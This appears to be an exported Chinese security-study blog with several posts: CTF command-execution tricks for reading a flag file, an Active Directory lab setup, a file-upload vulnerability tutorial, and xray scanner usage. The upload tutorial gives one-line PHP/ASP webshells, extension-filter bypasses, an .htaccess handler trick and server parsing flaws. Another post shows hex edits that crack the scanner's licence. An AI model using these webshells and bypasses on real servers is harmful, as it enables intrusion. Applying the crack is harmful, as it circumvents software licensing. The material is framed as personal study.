<p>8.sort：主要用于排序文件 </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">/usr/bin/s?rt</span> <span class="string">/flag</span> </span><br><span class="line"><span class="string">so?t</span> <span class="string">/flag</span></span><br><span class="line"><span class="string">/usr/bin/sort</span> <span class="string">和</span> <span class="string">sort</span> <span class="string">实际上是同一个命令。/usr/bin</span> <span class="string">目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而</span> <span class="string">sort</span> <span class="string">命令通常就存放在</span> <span class="string">/usr/bin</span> <span class="string">目录中,因此/usr/bin/sort</span> <span class="string">/flag</span> <span class="string">和</span> <span class="string">sort</span> <span class="string">/flag</span> <span class="string">是等价的。有时候sort不行可能/usr/bin/s?rt可以</span></span><br></pre></td></tr></table></figure>
<p>9、uniq：报告或删除文件中重复的行，其实当成cat用就行</p>
<p>10、file -f:报错出具体内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">passthru(&quot;file</span> <span class="string">-f</span> <span class="string">/flag&quot;);</span></span><br></pre></td></tr></table></figure>
<p>11、grep：在文本中查找指定字符串</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">passthru(&quot;grep</span> <span class="string">fla</span> <span class="string">/fla*&quot;);</span></span><br></pre></td></tr></table></figure>
<p>12、strings：等于cat</p>
<h2 id="可参考观看的的连接"><a href="#可参考观看的的连接" class="headerlink" title="可参考观看的的连接"></a>可参考观看的的连接</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098885&amp;idx=1&amp;sn=7ae29de00da6dd4dd0d1dd80ec442cc7&amp;chksm=803c698cb74be09ac2134f4d55f64dc51a2e3ec114f5471511d00202e4b0d32ef7f484039f26&amp;mpshare=1&amp;scene=23&amp;srcid=0706J9BuISmH2RvRKeTexsfT&amp;sharer_sharetime=1657099643261&amp;sharer_shareid=9cd9dc169042726f3d8646a229a355c0#rd</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透日记之二</title>
    <url>/posts/84140d29.html</url>
    <content><![CDATA[<h1 id="域环境虚拟机安装"><a href="#域环境虚拟机安装" class="headerlink" title="域环境虚拟机安装"></a>域环境虚拟机安装</h1><p>文件 =&gt; 新建虚拟机 =&gt; 选择典型 =&gt; 下一步 =&gt; 安装程序光盘映像文件 其它的都可以默认</p>
<p>很花时间  建议闲暇时提前装，记得提前备好一个文件夹，vmware居然不会创建一个文件夹的~</p>
<p>还要安装补丁捏 ？这里密码都选择123456吧</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows Server 2008 R2 和 Windows 7 SP1 安装 vmtools 需要安装补丁： </span></span><br><span class="line"><span class="string">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows Server 2008 R2 和  Windows 7 SP1 安装 vmtools 需要安装补丁：</span></span><br><span class="line"><span class="string">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</span></span><br></pre></td></tr></table></figure>
<p>这辆安装的好像其实就是同一个 没必要重复下了</p>
<p>啊啊啊好多图片  推荐下面这个地址自己看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s?__biz=MzI5MTA1ODk5NQ==&amp;mid=2247484151&amp;idx=1&amp;sn=f1e95bb472fbe2793a213a2e2d7f4ec3</span><br></pre></td></tr></table></figure>
<p>难道说是设置密码的问题？没设置密码就会提示是否安装图形界面  我觉得好扯诶 害的我重装了一遍。</p>
<blockquote>
<p>[!CAUTION]</p>
<p>嗯，只有windows server 才有域控管理器安装 windows是没有这些的</p>
</blockquote>
<psw>沟槽的win7 win2008 垃圾IE浏览器 严重损耗我的生命，时间。</psw>
<p>首先需要安装tool工具  安装这个呢 又需要把cd 和 软盘设置为自动检测。</p>
<p>然后就能右击各自的windows安装vm工具了，<psw>沟槽的vmware 快捷键那么多？有毛用啊 能不能禁用了</psw></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504015355154.png" alt="image-20240504015355154">  </p>
<p>太难了  我哭死  怎么这么麻烦。下载半天 ，搞明白半天 。就为了安装个vmtool  ad还没开始装呢。</p>
<psw>域环境我看今天是搭不起来了</psw>
<p>第二天起来继续x 首先搞个域控搭建在 win2012server 上。</p>
<p>给它装一个vmnet4的网卡，配置一个静态IP，这里创建10.10.10.0/24网段</p>
<blockquote>
<p>[!NOTE]</p>
<p>一般域控都不出网的，所以基本就是仅主机模式。</p>
</blockquote>
<p>配置静态IP，这里的网关默认是10.10.10.2，子网掩码因为是a类地址，所以是255.0.0.0</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504110334104.png" alt="image-20240504110334104" style="zoom:50%;" /></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504110508210.png" alt="image-20240504110508210" style="zoom:50%;" /> </p>
<p> 这样子就是成功了x</p>
<p>然后进入服务器管理添加角色 = &gt; 下一步 = &gt; 下一步 = &gt; 下一步 =&gt; 添加active directory 域服务 （DNS服务器 ，可选 会自动安装的。x主机名也可以自己改的。)</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504111339867.png" alt="image-20240504111339867" style="zoom:50%;" /></p>
<p>来到下一步，这里安装了域服务，但还没有成为域控，还需要进一步配置</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504111451746.png" alt="image-20240504111451746" style="zoom:50%;" /> </p>
<p>然后选择 添加新林，然后自己取一个根域名字 。（这里大小写不会区分的  ，请自己取一个，<psw>这里是lanyuan.com</psw></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504111550287.png" alt="image-20240504111550287" style="zoom:50%;" /> </p>
<p>下一步，搞个密码说是 （这里还要大小写字母，很难记诶 8位以上，数字字母符号   <psw>123456Aa.</psw></p>
<p>这里的委派不要管 ，</p>
<p>NetBIOS  主机名IP 自动识别 不用管，下一步,显示administator密码，可以先到这里改一下。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504112756624.png" alt="image-20240504112756624" style="zoom:50%;" /> </p>
<p>进入设置一个强密码就好了，然后就安装完成，自动重启。</p>
<p>重启完成，这里管理员名字就会有一个变化。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504113614702.png" alt="image-20240504113614702" style="zoom:67%;" /> </p>
<p>然后到这里管理中心，增加你的域控制成员~</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504113827220.png" alt="image-20240504113827220" style="zoom:50%;" /> </p>
<p>首先选择Users  然后在右边选择新建，这里添加了一个user001的成员，然后通过后面的给win2008入域，他就能用这个用户登录了。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504121210568.png" alt="image-20240504121210568"></p>
<p>那么对win 2008 入狱x（入域） 同样给他设置静态IP地址 要和上面的在同一个网段。 over</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504114302284.png" alt="image-20240504114302284" style="zoom:67%;" /> </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504114507441.png" alt="image-20240504114507441" style="zoom:50%;" /> </p>
<p>输入你的域名= &gt; 确认  ，输入你的域用户名 密码 就加入成功了。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504114741027.png" alt="image-20240504114741027" style="zoom:50%;" /> </p>
<p>这样子就成功啦。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504114935657.png" alt="image-20240504114935657" style="zoom:67%;" /> </p>
<p>然后通过这个主机就能登录user001用户甚至登录到域管理员用户，（moaiyuan是域控自创的用户来着的吧</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504115220721.png" alt="image-20240504115220721" style="zoom: 50%;" /> </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504121516349.png" alt="image-20240504121516349" style="zoom:50%;" /> </p>
<p> 首次登录还要改密码（这里设置一下 <psw>qwertyAa.</psw></p>
<p>然后在域控2012的computers也可以看见他登录进来了。域控可以随时进行密码的更改，不过不能查看呢。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504115322212.png" alt="image-20240504115322212" style="zoom: 50%;" /> </p>
<p>设置win2007</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504122109011.png" alt="image-20240504122109011" style="zoom:50%;" /> </p>
<p>还是老样子添加到域成员，（这里登录域控的管理员账号或者普通成员都可以加入成功好像）然后win2012就可以看见他的上线了）</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504122932502.png" alt="image-20240504122932502" style="zoom:50%;" /> </p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>1.成为域控dc   安装AD ；然后就能拥有 用户组（domain admins）和 用户组（domain users）</p>
<blockquote>
<p>[!IMPORTANT]</p>
<p>这里domain users 有一个不添加就有的krbtgt</p>
</blockquote>
<p>2.添加进域  ； 拥有原本的工作组用户（pc-lanyuan1\lanyuan）以及登录进入域控的用户组。</p>
<h2 id="域和工作组的关系"><a href="#域和工作组的关系" class="headerlink" title="域和工作组的关系"></a>域和工作组的关系</h2><p>在工作组上你一切的设置在本机上进行包括各种策略，用户登录也是登录在本机的，密码是放在本机的数据库来验证的。而如果你的计算机加入域的话，各种策略是域控制器统一设定，用户名和密码也是放到域控制器去验证，也就是说你的账号密码可以在同一域的任何一台计算机登录。</p>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/posts/a0000001.html</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p> 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p>
<h2 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h2><ol>
<li>客户端javascript检测（检测文件扩展名）</li>
<li>服务端MIME类型检测（检测content-type 内容</li>
<li>服务端目录路径检查（检测跟path参数相关的内容</li>
<li>服务端文件扩展名检测（检测跟文件extension相关的内容</li>
<li>服务端文件内容检测（检测是否合法是否含有恶意代码</li>
</ol>
<h2 id="Webshell介绍"><a href="#Webshell介绍" class="headerlink" title="Webshell介绍"></a>Webshell介绍</h2><p>Webshell就是以asp、php、jsp或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称为一种网页后门。入侵者通常会将这些asp或php后门文件与网站web服务器目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门。</p>
<h3 id="常用一句话木马"><a href="#常用一句话木马" class="headerlink" title="常用一句话木马"></a>常用一句话木马</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">@eval($_POST[a]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line">&lt;%<span class="language-ruby">evalrequest(<span class="string">&quot;value&quot;</span>)</span>%&gt;</span><br><span class="line">&lt;%<span class="language-ruby">@ <span class="title class_">Page</span> language=<span class="string">&quot;Jscript&quot;</span></span>%&gt;&lt;%<span class="language-ruby">eval (<span class="title class_">Request</span>.<span class="title class_">Item</span>[<span class="string">&quot;value&quot;</span>])</span>%&gt;</span><br></pre></td></tr></table></figure>
<h2 id="文件上传的绕过脑图"><a href="#文件上传的绕过脑图" class="headerlink" title="文件上传的绕过脑图"></a>文件上传的绕过脑图</h2><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240517180815112.png" alt="image-20240517180815112"></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240517180751671.png" alt="image-20240517180751671"></p>
<h3 id="1-JS检测绕过"><a href="#1-JS检测绕过" class="headerlink" title="1)JS检测绕过"></a>1)JS检测绕过</h3><p>前端代码；</p>
<p>1.修改前端代码</p>
<p>2.抓个正常的包 修改</p>
<h3 id="2）服务端检测"><a href="#2）服务端检测" class="headerlink" title="2）服务端检测"></a>2）服务端检测</h3><p>通常三个方向：MIME,文件内容，文件后缀。</p>
<p>MIME绕过：修改Content-Type字段</p>
<p>文件后缀名绕过：一般是黑名单，或者直接白名单。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">黑名单策略：以.php为例</span></span><br><span class="line"><span class="number">1</span><span class="string">.大小写</span> <span class="string">（.Php)</span></span><br><span class="line"><span class="number">2</span><span class="string">.空格</span> <span class="string">在后缀名后加空格(.php</span> <span class="string">)</span></span><br><span class="line"><span class="number">3</span><span class="string">.点绕过</span> <span class="string">.php.</span></span><br><span class="line"><span class="number">4</span><span class="string">.::$DATA绕过</span> <span class="string">(.php::$DATA)</span></span><br><span class="line"><span class="number">5</span><span class="string">.配合Apache解析漏洞。后面有专门介绍</span></span><br><span class="line"><span class="number">6.</span><span class="string">htaccess文件</span> <span class="string">将图片解析为木马</span></span><br><span class="line"><span class="string">&lt;FileMatch</span> <span class="string">&quot;yuan.png&quot;</span><span class="string">&gt;</span></span><br><span class="line"><span class="string">setHandler</span> <span class="string">application/x-httpd-php</span></span><br><span class="line"><span class="string">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="string">白名单策略：</span></span><br><span class="line"></span><br><span class="line"><span class="string">%00截断：</span></span><br><span class="line"><span class="string">url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是%00字符，而是%00解码后的内容，即解码成了0x00。</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x00</span><span class="string">截断：</span></span><br><span class="line"><span class="string">系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但要注意是文件的十六进制内容里的00，而不是文件名中的00。</span></span><br></pre></td></tr></table></figure>
<h3 id="3）绕过文件内容检测"><a href="#3）绕过文件内容检测" class="headerlink" title="3）绕过文件内容检测"></a>3）绕过文件内容检测</h3><p>1.通过上传文件内容开始处的文件幻数来判断。</p>
<p>一般通过判断前10个字节，基本就能判断出一个文件的真是类型</p>
<p>绕过jpg文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">ÿØÿà%00àJFIF</span><br></pre></td></tr></table></figure>
<p>绕过gif文件幻数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = 47 49 46 38 39 61</span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
<p>绕过png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = 89 50 4E 47</span><br><span class="line">PNG</span><br></pre></td></tr></table></figure>
<p>2.文件加载检测</p>
<p>一般是调用API或函数对文件进行加载测试。常见的是图像渲染测试，甚至二次渲染。</p>
<p>图像处理软件对一张图片进行代码注入</p>
<p>原理是：在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般是图片的注释区</p>
<p>二次渲染的攻击方式-攻击文件加载器本身</p>
<p>溢出攻击对文件加载器进行攻击</p>
<h3 id="4）解析漏洞"><a href="#4）解析漏洞" class="headerlink" title="4）解析漏洞"></a>4）解析漏洞</h3><p>Apache解析漏洞</p>
<p>形式：test.php.qwe.asd 任意不属于Apache解析黑名单且也不属于白名单的名称</p>
<p>原理：Apache解析文件的规则是从右往左开始判断解析，如果后缀名为不可识别文件解析，就往左判断。</p>
<p>条件：apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被安装PHP后缀进行解析，导致绕过一些服务器的安全策略</p>
<p>www.xxx.com/test.php.qwe.asd</p>
<p>以moudel方式连接，配置文件httpd.conf中LoadMoudle rewrite_module</p>
<p>modules/mod_rewrite.so前的注释去掉，寻找关键词：AllowOveride,并把后面的参数从None全部改成All。</p>
<p>Ngnix解析漏洞</p>
<p>形式：任意文件名/任意文件名.php</p>
<p>一个在任意文件名后面加/任意文件名.php的解析漏洞</p>
<p>原理：Ngnix《0.8.37默认是以CGI的方式支持php解析的，普遍的做法是在Ngnix通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为phpinfo.jpg1.php,然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP如果开启fix_pathinfo这个选项。就会将SCRIPY_FILENAME是phpinfo.jpg，而1.php是PATH_INFO,所以就会将phpinfo.jpg作为php文件来解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞形式：</span><br><span class="line"></span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/1.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/ \0.php</span><br></pre></td></tr></table></figure>
<p>IIS 6.0解析漏洞</p>
<p>1.目录解析</p>
<p>形式：www.xxx.com/xx.asp/xx.jpg</p>
<p>原理：服务器默认会吧.asp目录下的文件都解析成asp文件</p>
<p>2.文件解析</p>
<p>形式：www.xxx.com/xx.asp;.jpg</p>
<p>原理：服务器默认不解析；后面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认的可执行文件除了asp还包含</span><br><span class="line">/test.asa</span><br><span class="line">/test.cer</span><br><span class="line">/test.cdx</span><br></pre></td></tr></table></figure>
<p>IIS7.0/7.5解析漏洞</p>
<p>形式：任意文件名/任意文件名.php</p>
<p>原理：对任意文件只要在URL后面追加上字符串/任意文件名.php就会按照php的方式去解析</p>
<h2 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h2><p>1.文件上传的目录设置为不可执行</p>
<p>2.判断文件类型</p>
<p>3.使用随机数该写文件名和文件路径</p>
<p>4.单独设置文件服务器的域名</p>
<blockquote>
<p>[!NOTE]</p>
<p>svg文件</p>
<p>pdf文件</p>
<p>上传存储型xss</p>
</blockquote>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透日记之一</title>
    <url>/posts/bf942380.html</url>
    <content><![CDATA[<h1 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h1><p>下载并解压获得的文件。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503214231565.png" alt="image-20240503214231565"></p>
<p>点击VMware 文件 =&gt; 扫描虚拟机。 选择安装目录 通过虚拟机扫描直接添加进VMware</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503214945077.png" alt="image-20240503214945077" style="zoom: 50%;" /> </p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="拓扑图如下"><a href="#拓扑图如下" class="headerlink" title="拓扑图如下"></a>拓扑图如下</h2><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503215713087.png" alt="image-20240503215713087" style="zoom: 50%;" /> </p>
<h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><p>点击 编辑 =&gt; 虚拟网络编辑器。在里面配置网卡。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503220012554.png" alt="image-20240503220012554" style="zoom: 50%;" /></p>
<p>首先要点击 更改设置 管理员模式才能对这个进行更改。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503221244410.png" alt="image-20240503221244410" style="zoom:50%;" /> </p>
<p>根据拓扑图，需要设置一个nat模式的 以及两个 仅主机模式的网卡,不过nat模式可以自动获取，并且这里centos也已经配好了IP地址，所以可以不用管的</p>
<p>那么就只需要配置192.168.22.0/24和192.168.33.0/24段的网卡。设置好子网IP和子网掩码就ok了，还有DHCP也要设置一下从0到255.</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503224427829.png" alt="image-20240503224427829" style="zoom:50%;" /> vmnet3</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503224543245.png" alt="image-20240503224543245" style="zoom:50%;" /> vmnet2</p>
<p>配置完成后就可以给机器安装网卡了</p>
<h3 id="选中Target1"><a href="#选中Target1" class="headerlink" title="选中Target1"></a>选中Target1</h3><p>点击 编辑虚拟器设置 =&gt; 添加 =&gt; 网络适配器 =&gt; 确认</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225003749.png" alt="image-20240503225003749"> </p>
<p>设置成该图就好了</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225050960.png" alt="image-20240503225050960" style="zoom:50%;" /> </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225109418.png" alt="image-20240503225109418" style="zoom:50%;" /> </p>
<h3 id="选择target2"><a href="#选择target2" class="headerlink" title="选择target2"></a>选择target2</h3><p>这个样子就好</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225324349.png" alt="image-20240503225324349" style="zoom:50%;" /> </p>
<h3 id="选中target3"><a href="#选中target3" class="headerlink" title="选中target3"></a>选中target3</h3><p>如图~</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225441205.png" alt="image-20240503225441205" style="zoom:50%;" /> </p>
<h2 id="配置宝塔web服务"><a href="#配置宝塔web服务" class="headerlink" title="配置宝塔web服务"></a>配置宝塔web服务</h2><p>登录进入Target1，账号密码在左下角的描述都有说明 （root : root）</p>
<p>输入ifconfig查看配置是否成功</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503230007032.png" alt="image-20240503230007032" style="zoom: 67%;" /></p>
<p>嗯，看到如图差不多的样子就说明成功，其中192.168.190.132 会视情况有所不同。</p>
<p>没有获取IP地址可以尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network <span class="comment">#重启网络</span></span><br><span class="line">reboot <span class="comment">#重启系统</span></span><br></pre></td></tr></table></figure>
<p>以及物理机重启该网卡</p>
<p>这之后就能对宝塔的web服务进行配置了。</p>
<p>访问</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">http://你的IP地址:8888/a768f109/</span></span><br></pre></td></tr></table></figure>
<p>输入账号密码</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">账号：eaj3yhsl</span></span><br><span class="line"><span class="string">密码：41bb8fee</span></span><br></pre></td></tr></table></figure>
<p>这之后点击网站 =&gt;设置 =&gt; 域名管理 =&gt; 添加两个IP地址的站点</p>
<p> <img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503233237564.png" alt="image-20240503233237564"></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231201812.png" alt="image-20240503231201812"></p>
<p>访问如上的url 看到如上界面就代表成功了·</p>
<p>进入Target2。账号密码还是左下描述有 （root ：root),还是老样子 ifconfig看配置成功没有</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231515572.png" alt="image-20240503231515572" style="zoom:67%;" /> </p>
<p>不过这里还要回去改一下虚拟网卡的设置  设置能够连接到主机不然连不上web，连接完记得改回去</p>
<p>&lt;img src=”<a href="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231854373.png">https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231854373.png</a>“ alt=”image-20240503231854373” style=”zoom:50%;” </p>
<p>进入web后台，这里都一样不用改了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.22.22:8888/2cc52ec0/</span><br><span class="line">账号：xdynr37d</span><br><span class="line">密码：123qwe..</span><br></pre></td></tr></table></figure>
<p>网站 =&gt; 设置 =&gt; 添加域名 192.168.33.22 ,浏览器访问192.168.22.22页面成功就好了</p>
<p> <img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503233549824.png" alt="image-20240503233549824" style="zoom:50%;" /></p>
<p>最后进入Target3， 密码root，输入ipconfig</p>
<p>能看见ip地址就说明成功 当然也可以ping一下</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503234121231.png" alt="image-20240503234121231"> </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503234411799.png" alt="image-20240503234411799" style="zoom: 67%;" /> </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503234459802.png" alt="image-20240503234459802" style="zoom:80%;" /> </p>
<p>最后改成不连接主机，大功告成。</p>
<p>最后还可以拍摄一下快照。</p>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞扫描器</title>
    <url>/posts/a0000003.html</url>
    <content><![CDATA[<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><blockquote>
<p>[!NOTE]</p>
<p>xray（网站sql注入，命令执行，xss….）+RAD</p>
<p>图形化GOBY 信息收集，扫描端口，爆破服务弱口令，漏洞扫描，插件</p>
<p>nuclei 历史漏洞（8000+ 历史漏洞的POC【漏洞检测脚本】）</p>
</blockquote>
<h2 id="XRAY"><a href="#XRAY" class="headerlink" title="XRAY"></a>XRAY</h2><p>检测速度快；支持范围广；代码质量高；高级可定制；安全无威胁；（长亭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git地址：https://github.com/chaitin/xray</span><br><span class="line">官方文档：https://docs.xray.cool/#/</span><br></pre></td></tr></table></figure>
<p>破解社区版</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">010editor：crtl+f；搜索修改以下内容</span><br><span class="line">43 4F 4D 4D 55 4E 49 54 59</span><br><span class="line">434F4D4D554E495459</span><br><span class="line">COMMUNITY</span><br><span class="line"></span><br><span class="line">41 4F 4D 4D 55 4E 49 54 59</span><br><span class="line">AOMMUNITY</span><br><span class="line"></span><br><span class="line">41 44 56 41 4E 43 45 44 44</span><br><span class="line">ADVANCEDD</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 完整</span><br><span class="line">xray.exe webscan --basic-crawler http://testphp.vulnweb.com/ --html-output vulnweb.com-1.html</span><br><span class="line"></span><br><span class="line"># 简化</span><br><span class="line">xray.exe ws --basic http://testphp.vulnweb.com/ --ho vulnweb.com-2.html</span><br></pre></td></tr></table></figure>
<p>和bp一起：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先生成证书：</span><br><span class="line">xray.exe genca </span><br><span class="line">安装证书到本地计算机</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240605204425187.png" alt="image-20240605204425187" style="zoom:50%;" /> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启监听：</span><br><span class="line"># 完整</span><br><span class="line">xray.exe webscan --listen 127.0.0.1:7777 --html-output testphp.html</span><br><span class="line"># 简化</span><br><span class="line">xray.exe ws --listen 127.0.0.1:7777 --ho testphp.html</span><br></pre></td></tr></table></figure>
<h3 id="浏览器设置代理："><a href="#浏览器设置代理：" class="headerlink" title="浏览器设置代理："></a>浏览器设置代理：</h3><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240605202501172.png" alt="image-20240605202501172"></p>
<p>浏览器访问就能对站点进行扫描。</p>
